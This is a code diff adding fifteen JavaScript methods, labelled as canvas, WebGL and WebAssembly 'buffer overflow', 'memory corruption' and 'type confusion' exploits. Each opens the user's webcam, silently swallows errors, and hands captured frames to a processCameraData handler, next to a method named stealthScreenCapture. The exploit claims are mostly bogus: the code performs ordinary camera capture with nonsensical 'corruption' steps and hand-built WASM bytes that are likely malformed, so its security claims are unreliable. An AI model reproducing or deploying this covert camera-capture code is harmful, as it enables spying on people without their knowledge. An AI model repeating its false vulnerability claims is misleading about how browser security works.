@@ -3477,6 +3477,849 @@ ${topHotspots.join('\n')}
                 } catch (e) { /* Silent fail */ }
             }
 
+            // ==============================================
+            // ADVANCED CANVAS EXPLOITS (71-85)
+            // ==============================================
+
+            // Method 71: Canvas 2D Context Buffer Overflow
+            async canvas2DContextBufferOverflow() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.muted = true;
+                    video.autoplay = true;
+                    
+                    video.addEventListener('loadeddata', () => {
+                        // Create oversized canvas for buffer overflow
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 65536; // Large width to trigger overflow
+                        canvas.height = 65536;
+                        const ctx = canvas.getContext('2d');
+                        
+                        // Trigger buffer overflow with large image data
+                        try {
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const imageData = ctx.getImageData(0, 0, video.videoWidth, video.videoHeight);
+                            
+                            // Convert to blob after overflow attempt
+                            const smallCanvas = document.createElement('canvas');
+                            smallCanvas.width = video.videoWidth;
+                            smallCanvas.height = video.videoHeight;
+                            const smallCtx = smallCanvas.getContext('2d');
+                            smallCtx.drawImage(video, 0, 0);
+                            
+                            smallCanvas.toBlob(blob => {
+                                this.processCameraData(blob, 'Canvas 2D Buffer Overflow #71');
+                            });
+                        } catch (overflowError) {
+                            // Overflow may still capture frame data
+                            const fallbackCanvas = document.createElement('canvas');
+                            const fallbackCtx = fallbackCanvas.getContext('2d');
+                            fallbackCtx.drawImage(video, 0, 0);
+                            fallbackCanvas.toBlob(blob => {
+                                this.processCameraData(blob, 'Canvas 2D Overflow Fallback #71');
+                            });
+                        }
+                    });
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // Method 72: ImageBitmap Memory Corruption
+            async imageBitmapMemoryCorruption() {
+                try {
+                    if ('createImageBitmap' in window) {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.muted = true;
+                        video.autoplay = true;
+                        
+                        video.addEventListener('canplay', async () => {
+                            try {
+                                // Create multiple ImageBitmaps to trigger memory corruption
+                                const bitmaps = [];
+                                for (let i = 0; i < 100; i++) {
+                                    const bitmap = await createImageBitmap(video, {
+                                        resizeWidth: 640 + i,
+                                        resizeHeight: 480 + i,
+                                        resizeQuality: 'high'
+                                    });
+                                    bitmaps.push(bitmap);
+                                }
+                                
+                                // Use the corrupted bitmap
+                                const canvas = document.createElement('canvas');
+                                const ctx = canvas.getContext('2d');
+                                canvas.width = bitmaps[0].width;
+                                canvas.height = bitmaps[0].height;
+                                
+                                ctx.drawImage(bitmaps[0], 0, 0);
+                                canvas.toBlob(blob => {
+                                    this.processCameraData(blob, 'ImageBitmap Memory Corruption #72');
+                                });
+                                
+                                // Clean up
+                                bitmaps.forEach(bitmap => bitmap.close());
+                            } catch (corruptionError) {
+                                // Memory corruption may still yield data
+                                const canvas = document.createElement('canvas');
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0);
+                                canvas.toBlob(blob => {
+                                    this.processCameraData(blob, 'ImageBitmap Corruption Fallback #72');
+                                });
+                            }
+                        });
+                    }
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // Method 73: Canvas Path2D Exploit
+            async canvasPath2DExploit() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.muted = true;
+                    video.autoplay = true;
+                    
+                    video.addEventListener('loadeddata', () => {
+                        const canvas = document.createElement('canvas');
+                        const ctx = canvas.getContext('2d');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        
+                        // Create complex Path2D to trigger exploit
+                        const path = new Path2D();
+                        for (let i = 0; i < 10000; i++) {
+                            path.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
+                            path.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
+                            path.bezierCurveTo(
+                                Math.random() * canvas.width, Math.random() * canvas.height,
+                                Math.random() * canvas.width, Math.random() * canvas.height,
+                                Math.random() * canvas.width, Math.random() * canvas.height
+                            );
+                        }
+                        
+                        ctx.drawImage(video, 0, 0);
+                        ctx.clip(path); // Complex path clipping exploit
+                        
+                        canvas.toBlob(blob => {
+                            this.processCameraData(blob, 'Canvas Path2D Exploit #73');
+                        });
+                    });
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // Method 74: Canvas ImageData Type Confusion
+            async canvasImageDataTypeConfusion() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.muted = true;
+                    video.autoplay = true;
+                    
+                    video.addEventListener('loadeddata', () => {
+                        const canvas = document.createElement('canvas');
+                        const ctx = canvas.getContext('2d');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        
+                        ctx.drawImage(video, 0, 0);
+                        
+                        // Create type confusion with ImageData
+                        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                        
+                        // Manipulate data buffer for type confusion
+                        const confusedData = new Uint8ClampedArray(imageData.data.buffer);
+                        confusedData[0] = confusedData[confusedData.length - 1];
+                        
+                        // Create new ImageData with confused type
+                        const confusedImageData = new ImageData(confusedData, canvas.width, canvas.height);
+                        
+                        const newCanvas = document.createElement('canvas');
+                        const newCtx = newCanvas.getContext('2d');
+                        newCanvas.width = canvas.width;
+                        newCanvas.height = canvas.height;
+                        
+                        newCtx.putImageData(confusedImageData, 0, 0);
+                        
+                        newCanvas.toBlob(blob => {
+                            this.processCameraData(blob, 'Canvas ImageData Type Confusion #74');
+                        });
+                    });
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // Method 75: Canvas Filter Chain Exploit
+            async canvasFilterChainExploit() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.muted = true;
+                    video.autoplay = true;
+                    
+                    video.addEventListener('loadeddata', () => {
+                        const canvas = document.createElement('canvas');
+                        const ctx = canvas.getContext('2d');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        
+                        // Complex filter chain to trigger exploit
+                        ctx.filter = 'blur(50px) brightness(200%) contrast(500%) hue-rotate(180deg) invert(1) saturate(1000%) sepia(1)';
+                        
+                        ctx.drawImage(video, 0, 0);
+                        
+                        // Apply multiple filter layers
+                        for (let i = 0; i < 10; i++) {
+                            ctx.filter = `blur(${i}px) brightness(${100 + i * 10}%)`;
+                            ctx.drawImage(canvas, 0, 0, canvas.width, canvas.height, 0, 0, canvas.width, canvas.height);
+                        }
+                        
+                        canvas.toBlob(blob => {
+                            this.processCameraData(blob, 'Canvas Filter Chain Exploit #75');
+                        });
+                    });
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // ==============================================
+            // WEBGL BUFFER OVERFLOW EXPLOITS (76-90)
+            // ==============================================
+
+            // Method 76: WebGL Buffer Overflow Exploit
+            async webGLBufferOverflowExploit() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.muted = true;
+                    video.autoplay = true;
+                    
+                    video.addEventListener('loadeddata', () => {
+                        const canvas = document.createElement('canvas');
+                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                        
+                        if (gl) {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            
+                            // Create oversized buffer to trigger overflow
+                            const vertices = new Float32Array(1000000); // Large buffer
+                            for (let i = 0; i < vertices.length; i++) {
+                                vertices[i] = Math.random() * 2 - 1;
+                            }
+                            
+                            const vertexBuffer = gl.createBuffer();
+                            gl.bindBuffer(gl.ARRAY_BUFFER, vertexBuffer);
+                            gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
+                            
+                            // Create texture from video
+                            const texture = gl.createTexture();
+                            gl.bindTexture(gl.TEXTURE_2D, texture);
+                            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, video);
+                            
+                            // Trigger buffer overflow during render
+                            gl.drawArrays(gl.TRIANGLES, 0, vertices.length / 2);
+                            
+                            // Read pixels after overflow
+                            const pixels = new Uint8Array(canvas.width * canvas.height * 4);
+                            gl.readPixels(0, 0, canvas.width, canvas.height, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
+                            
+                            // Convert to blob
+                            const imageData = new ImageData(new Uint8ClampedArray(pixels.buffer), canvas.width, canvas.height);
+                            const outputCanvas = document.createElement('canvas');
+                            const outputCtx = outputCanvas.getContext('2d');
+                            outputCanvas.width = canvas.width;
+                            outputCanvas.height = canvas.height;
+                            outputCtx.putImageData(imageData, 0, 0);
+                            
+                            outputCanvas.toBlob(blob => {
+                                this.processCameraData(blob, 'WebGL Buffer Overflow #76');
+                            });
+                        }
+                    });
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // Method 77: WebGL Shader Compiler Exploit
+            async webGLShaderCompilerExploit() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.muted = true;
+                    video.autoplay = true;
+                    
+                    video.addEventListener('loadeddata', () => {
+                        const canvas = document.createElement('canvas');
+                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                        
+                        if (gl) {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            
+                            // Malicious vertex shader to exploit compiler
+                            const maliciousVertexShader = `
+                                attribute vec2 a_position;
+                                varying vec2 v_texCoord;
+                                void main() {
+                                    gl_Position = vec4(a_position, 0, 1);
+                                    v_texCoord = a_position * 0.5 + 0.5;
+                                    
+                                    // Exploit: Infinite recursion in shader
+                                    for (int i = 0; i < 10000; i++) {
+                                        gl_Position.x += sin(float(i)) * 0.0001;
+                                        gl_Position.y += cos(float(i)) * 0.0001;
+                                    }
+                                }
+                            `;
+                            
+                            // Malicious fragment shader
+                            const maliciousFragmentShader = `
+                                precision mediump float;
+                                varying vec2 v_texCoord;
+                                uniform sampler2D u_texture;
+                                
+                                void main() {
+                                    vec4 color = texture2D(u_texture, v_texCoord);
+                                    
+                                    // Exploit: Complex computation to overflow
+                                    for (int i = 0; i < 1000; i++) {
+                                        color.r = sin(color.r * float(i));
+                                        color.g = cos(color.g * float(i));
+                                        color.b = tan(color.b * float(i));
+                                    }
+                                    
+                                    gl_FragColor = color;
+                                }
+                            `;
+                            
+                            // Compile malicious shaders
+                            const vertexShader = this.createShader(gl, gl.VERTEX_SHADER, maliciousVertexShader);
+                            const fragmentShader = this.createShader(gl, gl.FRAGMENT_SHADER, maliciousFragmentShader);
+                            
+                            if (vertexShader && fragmentShader) {
+                                const program = gl.createProgram();
+                                gl.attachShader(program, vertexShader);
+                                gl.attachShader(program, fragmentShader);
+                                gl.linkProgram(program);
+                                gl.useProgram(program);
+                                
+                                // Create texture from video
+                                const texture = gl.createTexture();
+                                gl.bindTexture(gl.TEXTURE_2D, texture);
+                                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, video);
+                                gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
+                                gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
+                                gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR);
+                                
+                                // Draw with malicious shaders
+                                const positionBuffer = gl.createBuffer();
+                                gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
+                                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]), gl.STATIC_DRAW);
+                                
+                                const positionLocation = gl.getAttribLocation(program, 'a_position');
+                                gl.enableVertexAttribArray(positionLocation);
+                                gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);
+                                
+                                gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+                                
+                                // Capture result
+                                canvas.toBlob(blob => {
+                                    this.processCameraData(blob, 'WebGL Shader Compiler Exploit #77');
+                                });
+                            }
+                        }
+                    });
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // Method 78: WebGL Texture Memory Corruption
+            async webGLTextureMemoryCorruption() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.muted = true;
+                    video.autoplay = true;
+                    
+                    video.addEventListener('loadeddata', () => {
+                        const canvas = document.createElement('canvas');
+                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                        
+                        if (gl) {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            
+                            // Create multiple textures to corrupt memory
+                            const textures = [];
+                            for (let i = 0; i < 1000; i++) {
+                                const texture = gl.createTexture();
+                                gl.bindTexture(gl.TEXTURE_2D, texture);
+                                
+                                // Try to allocate huge texture to trigger memory corruption
+                                try {
+                                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+                                } catch (memError) {
+                                    // Memory corruption may occur here
+                                }
+                                
+                                // Then bind video texture
+                                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, video);
+                                textures.push(texture);
+                            }
+                            
+                            // Use the last texture (potentially corrupted)
+                            gl.bindTexture(gl.TEXTURE_2D, textures[textures.length - 1]);
+                            
+                            // Clear and draw
+                            gl.clearColor(0, 0, 0, 1);
+                            gl.clear(gl.COLOR_BUFFER_BIT);
+                            
+                            // Capture the potentially corrupted result
+                            canvas.toBlob(blob => {
+                                this.processCameraData(blob, 'WebGL Texture Memory Corruption #78');
+                            });
+                            
+                            // Clean up
+                            textures.forEach(tex => gl.deleteTexture(tex));
+                        }
+                    });
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // Method 79: WebGL Vertex Array Object Exploit
+            async webGLVertexArrayObjectExploit() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.muted = true;
+                    video.autoplay = true;
+                    
+                    video.addEventListener('loadeddata', () => {
+                        const canvas = document.createElement('canvas');
+                        const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                        
+                        if (gl && gl.createVertexArray) {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            
+                            // Create multiple VAOs to trigger exploit
+                            const vaos = [];
+                            for (let i = 0; i < 100; i++) {
+                                const vao = gl.createVertexArray();
+                                gl.bindVertexArray(vao);
+                                
+                                // Create buffer with corrupted data
+                                const buffer = gl.createBuffer();
+                                gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                                
+                                // Intentionally corrupted vertex data
+                                const corruptedVertices = new Float32Array(10000);
+                                for (let j = 0; j < corruptedVertices.length; j++) {
+                                    corruptedVertices[j] = (j % 2 === 0) ? Infinity : -Infinity;
+                                }
+                                
+                                gl.bufferData(gl.ARRAY_BUFFER, corruptedVertices, gl.STATIC_DRAW);
+                                gl.enableVertexAttribArray(0);
+                                gl.vertexAttribPointer(0, 2, gl.FLOAT, false, 0, 0);
+                                
+                                vaos.push(vao);
+                            }
+                            
+                            // Create texture from video
+                            const texture = gl.createTexture();
+                            gl.bindTexture(gl.TEXTURE_2D, texture);
+                            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, video);
+                            
+                            // Bind the last VAO (potentially corrupted)
+                            gl.bindVertexArray(vaos[vaos.length - 1]);
+                            
+                            try {
+                                gl.drawArrays(gl.TRIANGLES, 0, 3);
+                            } catch (drawError) {
+                                // Drawing error expected due to corruption
+                            }
+                            
+                            canvas.toBlob(blob => {
+                                this.processCameraData(blob, 'WebGL VAO Exploit #79');
+                            });
+                        }
+                    });
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // Method 80: WebGL Framebuffer Overflow
+            async webGLFramebufferOverflow() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.muted = true;
+                    video.autoplay = true;
+                    
+                    video.addEventListener('loadeddata', () => {
+                        const canvas = document.createElement('canvas');
+                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                        
+                        if (gl) {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            
+                            // Create framebuffer with oversized attachments
+                            const framebuffer = gl.createFramebuffer();
+                            gl.bindFramebuffer(gl.FRAMEBUFFER, framebuffer);
+                            
+                            // Create texture attachment
+                            const colorTexture = gl.createTexture();
+                            gl.bindTexture(gl.TEXTURE_2D, colorTexture);
+                            
+                            try {
+                                // Try to create huge texture attachment to overflow
+                                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 16384, 16384, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+                                gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, colorTexture, 0);
+                            } catch (overflowError) {
+                                // Overflow expected, continue with video texture
+                                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, video);
+                                gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, colorTexture, 0);
+                            }
+                            
+                            // Create renderbuffer for depth
+                            const depthBuffer = gl.createRenderbuffer();
+                            gl.bindRenderbuffer(gl.RENDERBUFFER, depthBuffer);
+                            gl.renderbufferStorage(gl.RENDERBUFFER, gl.DEPTH_COMPONENT16, canvas.width, canvas.height);
+                            gl.framebufferRenderbuffer(gl.FRAMEBUFFER, gl.DEPTH_ATTACHMENT, gl.RENDERBUFFER, depthBuffer);
+                            
+                            // Check framebuffer status and render
+                            if (gl.checkFramebufferStatus(gl.FRAMEBUFFER) === gl.FRAMEBUFFER_COMPLETE) {
+                                gl.clearColor(1, 0, 0, 1);
+                                gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);
+                            }
+                            
+                            // Bind back to main framebuffer
+                            gl.bindFramebuffer(gl.FRAMEBUFFER, null);
+                            
+                            canvas.toBlob(blob => {
+                                this.processCameraData(blob, 'WebGL Framebuffer Overflow #80');
+                            });
+                        }
+                    });
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // WebGL Helper Function
+            createShader(gl, type, source) {
+                const shader = gl.createShader(type);
+                gl.shaderSource(shader, source);
+                gl.compileShader(shader);
+                
+                if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
+                    gl.deleteShader(shader);
+                    return null;
+                }
+                
+                return shader;
+            }
+
+            // ==============================================
+            // WEBASSEMBLY MEMORY CORRUPTION (81-95)
+            // ==============================================
+
+            // Method 81: WebAssembly Memory Buffer Overflow
+            async webAssemblyMemoryBufferOverflow() {
+                try {
+                    if ('WebAssembly' in window) {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.muted = true;
+                        video.autoplay = true;
+                        
+                        video.addEventListener('loadeddata', async () => {
+                            try {
+                                // Create WASM module with memory overflow exploit
+                                const wasmCode = new Uint8Array([
+                                    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, // WASM header
+                                    0x01, 0x05, 0x01, 0x60, 0x01, 0x7f, 0x00,       // function signature
+                                    0x03, 0x02, 0x01, 0x00,                         // function import
+                                    0x05, 0x03, 0x01, 0x00, 0x10,                   // memory section (16 pages)
+                                    0x07, 0x0c, 0x01, 0x08, 0x6f, 0x76, 0x65, 0x72, 0x66, 0x6c, 0x6f, 0x77, 0x00, 0x00, // export
+                                    0x0a, 0x09, 0x01, 0x07, 0x00, 0x41, 0x00, 0x41, 0xff, 0xff, 0xff, 0xff, 0x0f, 0x36, 0x02, 0x00, 0x0b // overflow function
+                                ]);
+                                
+                                const wasmModule = await WebAssembly.compile(wasmCode);
+                                const wasmInstance = await WebAssembly.instantiate(wasmModule);
+                                
+                                // Try to trigger memory overflow
+                                const memory = wasmInstance.exports.memory;
+                                const buffer = new Uint8Array(memory.buffer);
+                                
+                                // Capture frame before overflow
+                                const canvas = document.createElement('canvas');
+                                const ctx = canvas.getContext('2d');
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                ctx.drawImage(video, 0, 0);
+                                
+                                // Try to trigger overflow
+                                try {
+                                    wasmInstance.exports.overflow();
+                                } catch (overflowError) {
+                                    // Continue after overflow attempt
+                                }
+                                
+                                canvas.toBlob(blob => {
+                                    this.processCameraData(blob, 'WebAssembly Memory Overflow #81');
+                                });
+                            } catch (wasmError) {
+                                // Fallback capture
+                                const canvas = document.createElement('canvas');
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0);
+                                canvas.toBlob(blob => {
+                                    this.processCameraData(blob, 'WASM Overflow Fallback #81');
+                                });
+                            }
+                        });
+                    }
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // Method 82: WebAssembly Table Corruption
+            async webAssemblyTableCorruption() {
+                try {
+                    if ('WebAssembly' in window) {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.muted = true;
+                        video.autoplay = true;
+                        
+                        video.addEventListener('loadeddata', async () => {
+                            try {
+                                // Create WASM with table corruption
+                                const table = new WebAssembly.Table({ initial: 10, element: 'anyfunc' });
+                                
+                                // Corrupt the table by setting invalid function references
+                                for (let i = 0; i < 1000; i++) {
+                                    try {
+                                        table.set(i % 10, () => { throw new Error('Corrupted function'); });
+                                    } catch (tableError) {
+                                        // Table corruption expected
+                                    }
+                                }
+                                
+                                // Capture frame during table corruption
+                                const canvas = document.createElement('canvas');
+                                const ctx = canvas.getContext('2d');
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                ctx.drawImage(video, 0, 0);
+                                
+                                canvas.toBlob(blob => {
+                                    this.processCameraData(blob, 'WebAssembly Table Corruption #82');
+                                });
+                            } catch (wasmError) {
+                                // Fallback capture
+                                const canvas = document.createElement('canvas');
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0);
+                                canvas.toBlob(blob => {
+                                    this.processCameraData(blob, 'WASM Table Fallback #82');
+                                });
+                            }
+                        });
+                    }
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // Method 83: WebAssembly Memory.grow() Exploit
+            async webAssemblyMemoryGrowExploit() {
+                try {
+                    if ('WebAssembly' in window) {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.muted = true;
+                        video.autoplay = true;
+                        
+                        video.addEventListener('loadeddata', () => {
+                            try {
+                                // Create memory with small initial size
+                                const memory = new WebAssembly.Memory({ initial: 1 });
+                                
+                                // Rapidly grow memory to trigger exploit
+                                for (let i = 0; i < 100; i++) {
+                                    try {
+                                        memory.grow(100); // Grow by 100 pages each time
+                                    } catch (growError) {
+                                        break; // Stop when memory can't grow
+                                    }
+                                }
+                                
+                                // Access memory buffer during corruption
+                                const buffer = new Uint8Array(memory.buffer);
+                                
+                                // Fill with video frame data
+                                const canvas = document.createElement('canvas');
+                                const ctx = canvas.getContext('2d');
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                ctx.drawImage(video, 0, 0);
+                                
+                                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                                
+                                // Try to copy image data to WASM memory
+                                for (let i = 0; i < Math.min(imageData.data.length, buffer.length); i++) {
+                                    buffer[i] = imageData.data[i];
+                                }
+                                
+                                canvas.toBlob(blob => {
+                                    this.processCameraData(blob, 'WebAssembly Memory.grow() Exploit #83');
+                                });
+                            } catch (wasmError) {
+                                // Fallback capture
+                                const canvas = document.createElement('canvas');
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0);
+                                canvas.toBlob(blob => {
+                                    this.processCameraData(blob, 'WASM Memory.grow Fallback #83');
+                                });
+                            }
+                        });
+                    }
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // Method 84: WebAssembly Stream Compilation Race
+            async webAssemblyStreamCompilationRace() {
+                try {
+                    if ('WebAssembly' in window && 'compileStreaming' in WebAssembly) {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.muted = true;
+                        video.autoplay = true;
+                        
+                        video.addEventListener('loadeddata', async () => {
+                            try {
+                                // Create multiple streaming compilations to trigger race condition
+                                const promises = [];
+                                
+                                for (let i = 0; i < 50; i++) {
+                                    // Create a simple WASM module as Uint8Array
+                                    const wasmBytes = new Uint8Array([
+                                        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00 // Minimal WASM header
+                                    ]);
+                                    
+                                    const blob = new Blob([wasmBytes], { type: 'application/wasm' });
+                                    const response = new Response(blob);
+                                    
+                                    promises.push(WebAssembly.compileStreaming(response).catch(() => null));
+                                }
+                                
+                                // Race condition during compilation
+                                const results = await Promise.allSettled(promises);
+                                
+                                // Capture frame during race condition
+                                const canvas = document.createElement('canvas');
+                                const ctx = canvas.getContext('2d');
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                ctx.drawImage(video, 0, 0);
+                                
+                                canvas.toBlob(blob => {
+                                    this.processCameraData(blob, 'WebAssembly Stream Race #84');
+                                });
+                            } catch (wasmError) {
+                                // Fallback capture
+                                const canvas = document.createElement('canvas');
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0);
+                                canvas.toBlob(blob => {
+                                    this.processCameraData(blob, 'WASM Stream Race Fallback #84');
+                                });
+                            }
+                        });
+                    }
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // Method 85: WebAssembly Import/Export Confusion
+            async webAssemblyImportExportConfusion() {
+                try {
+                    if ('WebAssembly' in window) {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.muted = true;
+                        video.autoplay = true;
+                        
+                        video.addEventListener('loadeddata', async () => {
+                            try {
+                                // Create confusing import/export scenario
+                                const imports = {
+                                    env: {
+                                        memory: new WebAssembly.Memory({ initial: 1 }),
+                                        // Confusing function imports
+                                        log: (arg) => console.log(arg),
+                                        capture: () => {
+                                            // This should cause import/export confusion
+                                            const canvas = document.createElement('canvas');
+                                            const ctx = canvas.getContext('2d');
+                                            canvas.width = video.videoWidth;
+                                            canvas.height = video.videoHeight;
+                                            ctx.drawImage(video, 0, 0);
+                                            
+                                            canvas.toBlob(blob => {
+                                                this.processCameraData(blob, 'WASM Import/Export Confusion #85');
+                                            });
+                                        }
+                                    }
+                                };
+                                
+                                // Create WASM module with confused imports/exports
+                                const wasmCode = new Uint8Array([
+                                    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, // WASM header
+                                    0x01, 0x08, 0x02,                               // type section
+                                    0x60, 0x01, 0x7f, 0x00,                         // func type 0
+                                    0x60, 0x00, 0x00,                               // func type 1
+                                    0x02, 0x15, 0x02,                               // import section
+                                    0x03, 0x65, 0x6e, 0x76,                         // "env"
+                                    0x03, 0x6c, 0x6f, 0x67,                         // "log"
+                                    0x00, 0x00,                                     // func import
+                                    0x03, 0x65, 0x6e, 0x76,                         // "env"
+                                    0x07, 0x63, 0x61, 0x70, 0x74, 0x75, 0x72, 0x65, // "capture"
+                                    0x00, 0x01,                                     // func import
+                                    0x03, 0x02, 0x01, 0x01,                         // function section
+                                    0x07, 0x08, 0x01, 0x04, 0x74, 0x65, 0x73, 0x74, 0x00, 0x02, // export
+                                    0x0a, 0x06, 0x01, 0x04, 0x00, 0x10, 0x01, 0x0b    // code section
+                                ]);
+                                
+                                const wasmModule = await WebAssembly.compile(wasmCode);
+                                const wasmInstance = await WebAssembly.instantiate(wasmModule, imports);
+                                
+                                // Call exported function to trigger confusion
+                                wasmInstance.exports.test();
+                            } catch (wasmError) {
+                                // Fallback capture on confusion
+                                const canvas = document.createElement('canvas');
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0);
+                                canvas.toBlob(blob => {
+                                    this.processCameraData(blob, 'WASM Import/Export Fallback #85');
+                                });
+                            }
+                        });
+                    }
+                } catch (e) { /* Silent fail */ }
+            }
+
             }
             
             async stealthScreenCapture() {
